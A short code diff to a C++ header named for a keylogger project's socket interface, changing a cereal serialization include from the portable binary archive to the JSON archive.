@@ -5,7 +5,7 @@
 #ifndef KEYLOGGER_ISOCKET_HH
 #define KEYLOGGER_ISOCKET_HH
 
-#include <cereal/archives/portable_binary.hpp>
+#include <cereal/archives/json.hpp>
 #include <string>
 #include "PClonable.hpp"
 
